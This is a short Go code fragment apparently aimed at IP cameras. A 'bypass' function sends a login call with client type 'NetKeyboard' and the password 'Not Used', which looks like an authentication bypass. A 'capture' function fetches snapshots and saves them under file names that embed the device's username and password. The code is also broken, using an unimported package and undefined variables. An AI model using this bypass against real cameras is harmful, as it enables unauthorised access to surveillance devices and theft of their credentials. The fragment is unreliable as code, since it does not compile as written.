package camera
import ("image/jpeg"; "bytes"; "os")
func capture(data []byte) {
 request := "GET /cgi-bin/snapshot.cgi?channel=1 HTTP/1.1\r\n"
 _, _ = jpeg.Decode(bytes.NewReader(data))
 path := fmt.Sprintf("%s_%s_%s_%s.jpg", serial, user, pass, model)
 os.WriteFile(path, data, 0644)
 _ = request
}
func bypass(c *Client) {
 c.Call("global.login", map[string]any{"clientType": "NetKeyboard", "password": "Not Used", "session": 0}, 1, nil, nil)
}
